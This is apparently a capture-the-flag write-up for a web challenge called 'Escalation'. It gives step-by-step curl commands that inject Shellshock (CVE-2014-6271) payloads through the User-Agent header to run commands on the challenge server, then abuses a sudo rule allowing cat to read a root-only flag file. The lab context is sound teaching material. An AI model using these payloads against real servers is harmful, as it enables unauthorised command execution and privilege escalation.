# Escalation

- **Category**: Web  
- **Appearance conditions**: after solving Challenge `2014-6271`.  
- **Solution**: privilege escalation via improper sudo configuration.  

---

| Step | Screenshot |
|------|------------|
|1. Open the challenge and see the message *Do you find rootflag?*|<img width="505" height="241" alt="image" src="https://github.com/user-attachments/assets/fa0c75a4-4f1d-4ea6-b371-18752414068e" />|
|2. Try searching for *rootflag* on the server using the following command.<br>`curl -A "(){ :;}; /usr/bin/find / -type f -name *rootflag* 2>/dev/null " -b "your_session_cookie" https://nctf.xvps.jp/ntsettings/vuln.sh`<br>This reveals the *rootflag* file.|<img width="826" height="358" alt="image" src="https://github.com/user-attachments/assets/d9f4c694-d18d-4d2a-abd2-3e7a8f172c48" />|
|3. Next, check the file permission with the following command.<br>`curl -A "(){ :;}; /usr/bin/ls -la /tmp/hidden/access_denied/busted/rootflag.txt" -b "your_session_cookie" https://nctf.xvps.jp/ntsettings/vuln.sh`<br>The result shows you need root permission to read this file.<br><br>First, check the current login user using the `id` command:<br>`curl -A "(){ :; }; /usr/bin/id " -b "your_session_cookie" https://nctf.xvps.jp/ntsettings/vuln.sh`<br>The result shows the user is `www-data`, which is a low-privileged account.|<img width="1888" height="764" alt="image" src="https://github.com/user-attachments/assets/6f6ed8e6-fa1d-4803-936f-8a6d8134099d" />|
|4. How can we get root permission?<br>Although there are many ways to escalate privileges, this time we investigate `sudo`, since it is often the easiest method. (See [reference](https://linuc.org/study/column/4047/))||
|5. Run the `sudo -l` command. The `-l` option shows which programs can be run with root privileges by the current user.<br>The output shows `/usr/bin/cat` is allowed.|<img width="1897" height="914" alt="image" src="https://github.com/user-attachments/assets/806ddcc7-af5c-48d6-8692-98418e7784ee" />|
|6. Finally, read the *rootflag* file using `cat` with `sudo`.<br>`curl -A "(){ :; }; /usr/bin/sudo /usr/bin/cat /tmp/hidden/access_denied/busted/rootflag.txt" -b "session=your_cookie" https://nctf.xvps.jp/ntsettings/vuln.sh`<br><br>🎊 Congratulations! You got the flag.|<img width="1878" height="750" alt="image" src="https://github.com/user-attachments/assets/3df56fce-ccd6-4f42-83c6-2661eba4f3ff" />|
